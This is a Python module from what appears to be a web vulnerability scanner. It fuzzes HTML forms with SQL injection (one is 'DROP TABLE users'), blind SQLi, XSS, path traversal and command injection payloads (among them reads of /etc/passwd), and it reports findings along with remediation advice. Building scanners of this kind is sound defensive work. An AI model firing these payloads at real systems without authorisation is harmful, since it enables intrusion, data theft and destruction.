"""Form-based fuzzer: fuzz every discovered HTML form with SQL injection,
XSS, path traversal, command injection, and blind SQLi payloads.

Works with the forms discovered by ActiveCrawler.
"""
from __future__ import annotations

import time
import urllib.error
import urllib.parse
import urllib.request
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

from entropy.core.models import (
    Finding, FindingType, HTTPRequest, HTTPResponse, Severity, TestStep,
)
from entropy.discovery.crawler import FormSpec, FormInput


# ---------------------------------------------------------------------------
# Payload sets
# ---------------------------------------------------------------------------

SQLI_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "1' OR '1'='1",
    "admin'--",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--",
    "1; DROP TABLE users--",
    "1 OR 1=1",
    "' OR ''='",
    "1' AND '1'='1",
]

# Time-based blind SQLi: (label, payload, expected_delay_seconds)
TIME_SQLI_PAYLOADS: List[Tuple[str, str, float]] = [
    ("MySQL",      "' AND SLEEP(5)-- ",                     4.5),
    ("MySQL-num",  "1 AND SLEEP(5)",                         4.5),
    ("MSSQL",      "'; WAITFOR DELAY '0:0:5'-- ",           4.5),
    ("PostgreSQL", "'; SELECT pg_sleep(5)-- ",               4.5),
    ("SQLite",     "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000/2))))--", 3.0),
]

# Boolean-based blind SQLi: (true_payload, false_payload)
BOOL_SQLI_PAIRS: List[Tuple[str, str]] = [
    ("' OR '1'='1",   "' OR '1'='2"),
    ("1 OR 1=1",      "1 OR 1=2"),
    ("' OR 1=1-- ",   "' OR 1=2-- "),
    ("admin' OR 'a'='a", "admin' OR 'a'='b"),
]

XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "';alert(1)//",
    "<body onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
]

LFI_PAYLOADS: List[str] = [
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../../../../windows/system32/drivers/etc/hosts",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
]

CMD_PAYLOADS: List[str] = [
    "; ls -la",
    "| id",
    "| whoami",
    "; cat /etc/passwd",
    "& dir",
    "| type C:\\windows\\system32\\drivers\\etc\\hosts",
    "$(id)",
    "`id`",
    "; ping -c 3 127.0.0.1",
]

# Response indicators for detection
SQLI_INDICATORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "sqlstate", "odbc driver",
    "ora-00933", "ora-00907",
    "pg::syntaxerror", "invalid query",
    "sql syntax", "mysql_fetch", "num_rows",
    "supplied argument is not a valid mysql",
    "division by zero", "unknown column",
    "table 'information_schema",
    "#1064", "error in your sql syntax",
    "sqlite_step", "sqlite error",
    "syntax error, unexpected",
    "microsoft ole db provider for sql server",
    "mysql server version for the right syntax",
]

XSS_INDICATORS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "onerror=alert",
    "onload=alert",
]

LFI_INDICATORS = [
    "root:x:0:0", "daemon:x:", "/bin/bash", "/bin/sh",
    "windows/system32", "[boot loader]", "for 16-bit app support",
    "/proc/self/environ",
]

CMD_INDICATORS = [
    "uid=", "gid=", "total 0\n", "drwxr",
    "volume serial number", "directory of c:",
    "nobody:", "root:", "bin:", "daemon:",
]


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------

@dataclass
class FuzzResult:
    form:     FormSpec
    input_name: str
    payload:  str
    attack_type: str  # "sqli", "xss", "lfi", "cmd", "blind_sqli", "csrf"
    finding:  Optional[Finding] = None


# ---------------------------------------------------------------------------
# Form Fuzzer
# ---------------------------------------------------------------------------

class FormFuzzer:
    """
    Fuzzes every text-type input in every discovered HTML form.

    Attacks performed per input:
    - SQL injection (error-based)
    - Time-based blind SQL injection
    - Boolean-based blind SQL injection
    - XSS reflection
    - Path traversal / LFI
    - Command injection
    - CSRF check (missing token detection)
    """

    def __init__(
        self,
        timeout:    float = 8.0,    # longer for blind SQLi
        verify_ssl: bool  = True,
        concurrency: int  = 5,
        verbose:    bool  = False,
    ):
        self.timeout     = timeout
        self.verify_ssl  = verify_ssl
        self.concurrency = concurrency
        self.verbose     = verbose
        self._ctx        = self._build_ssl_ctx()

    # ------------------------------------------------------------------
    # Public
    # ------------------------------------------------------------------

    def fuzz_all(self, forms: List[FormSpec]) -> List[Finding]:
        """Fuzz all forms, return deduplicated findings."""
        all_findings: List[Finding] = []
        tasks = []

        for form in forms:
            # CSRF check first (no HTTP needed)
            csrf_finding = self._check_csrf(form)
            if csrf_finding:
                all_findings.append(csrf_finding)

            # Build fuzz tasks for injectable inputs
            for inp in form.injectable_inputs:
                tasks.append((form, inp))

        # Concurrent execution
        with ThreadPoolExecutor(max_workers=self.concurrency) as pool:
            futs = {pool.submit(self._fuzz_input, form, inp): (form, inp)
                    for form, inp in tasks}
            for fut in as_completed(futs):
                try:
                    findings = fut.result()
                    all_findings.extend(findings)
                except Exception:
                    pass

        return self._dedup(all_findings)

    # ------------------------------------------------------------------
    # Per-input fuzzing
    # ------------------------------------------------------------------

    def _fuzz_input(self, form: FormSpec, inp: FormInput) -> List[Finding]:
        findings: List[Finding] = []

        # --- Error-based SQLi ---
        for payload in SQLI_PAYLOADS[:6]:
            resp = self._submit_form(form, inp.name, payload)
            if resp and self._matches(str(resp.body or ""), SQLI_INDICATORS):
                findings.append(self._make_finding(
                    form, inp.name, payload,
                    FindingType.INJECTION, Severity.CRITICAL,
                    "SQL Injection (Error-Based)",
                    f"The input `{inp.name}` on `{form.action}` returned a database error "
                    f"confirming SQL injection. Payload: `{payload}`",
                    "Use parameterised queries / prepared statements. Never interpolate user input into SQL.",
                    resp,
                ))
                break  # one confirmed SQLi per input is enough

        # --- Time-based blind SQLi (only if no error-based found) ---
        if not any(f.type == FindingType.INJECTION for f in findings):
            for label, payload, threshold in TIME_SQLI_PAYLOADS[:3]:
                resp = self._submit_form(form, inp.name, payload)
                if resp and resp.latency_ms / 1000 >= threshold:
                    findings.append(self._make_finding(
                        form, inp.name, payload,
                        FindingType.INJECTION, Severity.CRITICAL,
                        f"Blind SQL Injection (Time-Based / {label})",
                        f"Input `{inp.name}` caused a {resp.latency_ms/1000:.1f}s delay "
                        f"with payload `{payload}` — time-based blind SQLi confirmed.",
                        "Use parameterised queries. Never pass user input directly to SQL.",
                        resp,
                    ))
                    break

        # --- Boolean-based blind SQLi ---
        if not any(f.type == FindingType.INJECTION for f in findings):
            for true_p, false_p in BOOL_SQLI_PAIRS[:2]:
                r_true  = self._submit_form(form, inp.name, true_p)
                r_false = self._submit_form(form, inp.name, false_p)
                if (r_true and r_false
                        and r_true.status_code == r_false.status_code
                        and abs(len(str(r_true.body or "")) - len(str(r_false.body or ""))) > 30):
                    findings.append(self._make_finding(
                        form, inp.name, true_p,
                        FindingType.INJECTION, Severity.HIGH,
                        "Blind SQL Injection (Boolean-Based)",
                        f"Input `{inp.name}` produces different response sizes for true/false "
                        f"SQL conditions — boolean-based blind SQLi likely.",
                        "Use parameterised queries.",
                        r_true,
                    ))
                    break

        # --- XSS ---
        for payload in XSS_PAYLOADS[:5]:
            resp = self._submit_form(form, inp.name, payload)
            if resp and self._check_xss(payload, str(resp.body or "")):
                findings.append(self._make_finding(
                    form, inp.name, payload,
                    FindingType.INJECTION, Severity.HIGH,
                    "Cross-Site Scripting (XSS)",
                    f"XSS payload reflected verbatim in response for input `{inp.name}` on `{form.action}`.",
                    "HTML-encode all user input before rendering. Use Content-Security-Policy.",
                    resp,
                ))
                break

        # --- LFI / Path Traversal (only for inputs that look like file/path params) ---
        path_hints = {"file", "path", "img", "image", "pic", "src", "page",
                      "template", "theme", "module", "include", "dir", "folder"}
        if inp.name.lower() in path_hints or any(h in inp.name.lower() for h in path_hints):
            for payload in LFI_PAYLOADS[:5]:
                resp = self._submit_form(form, inp.name, payload)
                if resp and self._matches(str(resp.body or ""), LFI_INDICATORS):
                    findings.append(self._make_finding(
                        form, inp.name, payload,
                        FindingType.DATA_LEAK, Severity.CRITICAL,
                        "Path Traversal / Local File Inclusion",
                        f"Input `{inp.name}` disclosed local file contents — path traversal confirmed.",
                        "Validate and sanitise file paths. Use allow-lists for filenames.",
                        resp,
                    ))
                    break

        # --- Command Injection ---
        for payload in CMD_PAYLOADS[:4]:
            resp = self._submit_form(form, inp.name, payload)
            if resp and self._matches(str(resp.body or ""), CMD_INDICATORS):
                findings.append(self._make_finding(
                    form, inp.name, payload,
                    FindingType.INJECTION, Severity.CRITICAL,
                    "Command Injection",
                    f"OS command output returned for input `{inp.name}` — command injection confirmed.",
                    "Never pass user input to shell commands. Use subprocess with argument lists.",
                    resp,
                ))
                break

        return findings

    # ------------------------------------------------------------------
    # CSRF detection (static — no HTTP)
    # ------------------------------------------------------------------

    def _check_csrf(self, form: FormSpec) -> Optional[Finding]:
        if form.method != "POST":
            return None
        if form.has_csrf_token:
            return None
        # Only flag forms that look like they do something meaningful
        meaningful = {"login", "register", "signup", "password", "email",
                      "delete", "transfer", "payment", "order", "update",
                      "edit", "submit", "post", "comment", "search"}
        action_lower = form.action.lower()
        has_meaningful_input = any(
            any(m in i.name.lower() for m in meaningful)
            for i in form.inputs
        )
        has_meaningful_action = any(m in action_lower for m in meaningful)
        if not (has_meaningful_input or has_meaningful_action):
            return None
        return Finding(
            type=FindingType.CSRF,
            severity=Severity.MEDIUM,
            title=f"CSRF Protection Missing: {form.action}",
            description=(
                f"The POST form at `{form.action}` (found on `{form.page_url}`) "
                f"has no CSRF token field. An attacker can forge requests on behalf of "
                f"authenticated users by tricking them into submitting this form."
            ),
            endpoint=f"POST {form.action}",
            remediation=(
                "Add a cryptographically random CSRF token to every state-changing form. "
                "Validate the token server-side on every POST request."
            ),
            evidence={"form": form.to_dict()},
        )

    # ------------------------------------------------------------------
    # HTTP form submission
    # ------------------------------------------------------------------

    def _submit_form(
        self,
        form:       FormSpec,
        target_input: str,
        payload:    str,
    ) -> Optional[HTTPResponse]:
        """Build form data with the payload injected into target_input, submit, return response."""
        # Build data dict: fill other fields with benign defaults
        data: Dict[str, str] = {}
        for inp in form.inputs:
            if inp.input_type.lower() in ("submit", "button", "reset", "image"):
                continue
            if inp.name == target_input:
                data[inp.name] = payload
            else:
                # Benign defaults by type
                if inp.input_type == "password":
                    data[inp.name] = "Password123!"
                elif inp.input_type == "email":
                    data[inp.name] = "test@example.com"
                elif inp.input_type == "number":
                    data[inp.name] = "1"
                elif inp.input_type == "hidden":
                    data[inp.name] = inp.value or "1"
                else:
                    data[inp.name] = inp.value or "test"

        start = time.monotonic()
        try:
            if form.method == "POST":
                body = urllib.parse.urlencode(data).encode()
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent":   "entropy-chaos/0.4.4 (security-scanner)",
                }
                req = urllib.request.Request(form.action, data=body, headers=headers, method="POST")
            else:
                qs  = urllib.parse.urlencode(data)
                url = f"{form.action}?{qs}" if qs else form.action
                req = urllib.request.Request(url, headers={"User-Agent": "entropy-chaos/0.4.4"}, method="GET")

            with urllib.request.urlopen(req, timeout=self.timeout, context=self._ctx) as resp:
                raw     = resp.read().decode(errors="replace")
                latency = (time.monotonic() - start) * 1000
                return HTTPResponse(status_code=resp.status, body=raw, latency_ms=latency)

        except urllib.error.HTTPError as exc:
            latency = (time.monotonic() - start) * 1000
            try:
                body = exc.read().decode(errors="replace")
            except Exception:
                body = str(exc)
            return HTTPResponse(status_code=exc.code, body=body, latency_ms=latency)
        except Exception:
            latency = (time.monotonic() - start) * 1000
            return HTTPResponse(status_code=0, body="", latency_ms=latency)

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _matches(self, text: str, indicators: List[str]) -> bool:
        text_lower = text.lower()
        return any(ind.lower() in text_lower for ind in indicators)

    def _check_xss(self, payload: str, response: str) -> bool:
        """Check if XSS payload reflected without HTML encoding."""
        import html
        resp_lower = response.lower()
        # Raw reflection (not encoded)
        if payload.lower() in resp_lower:
            # Make sure it's not HTML-encoded
            encoded = html.escape(payload).lower()
            if encoded not in resp_lower or payload.lower() in resp_lower:
                return True
        return False

    def _make_finding(
        self,
        form:       FormSpec,
        input_name: str,
        payload:    str,
        ftype:      FindingType,
        severity:   Severity,
        title:      str,
        description: str,
        remediation: str,
        resp:       Optional[HTTPResponse],
    ) -> Finding:
        req = HTTPRequest(
            method=form.method,
            url=form.action,
            body={input_name: payload},
        )
        step = TestStep(
            step_number=1,
            description=f"Submit form with `{input_name}={payload}`",
            request=req,
            response=resp,
            passed=False,
        )
        return Finding(
            type=ftype,
            severity=severity,
            title=title,
            description=description,
            endpoint=f"{form.method} {form.action}",
            persona="FormFuzzer",
            remediation=remediation,
            steps=[step],
            evidence={
                "input_name": input_name,
                "payload": payload,
                "status_code": resp.status_code if resp else 0,
                "form": form.to_dict(),
            },
        )

    def _dedup(self, findings: List[Finding]) -> List[Finding]:
        seen: set = set()
        result: List[Finding] = []
        for f in findings:
            key = (f.type, f.endpoint, f.title[:40])
            if key not in seen:
                seen.add(key)
                result.append(f)
        return result

    def _build_ssl_ctx(self):
        import ssl
        ctx = ssl.create_default_context()
        if not self.verify_ssl:
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
        return ctx
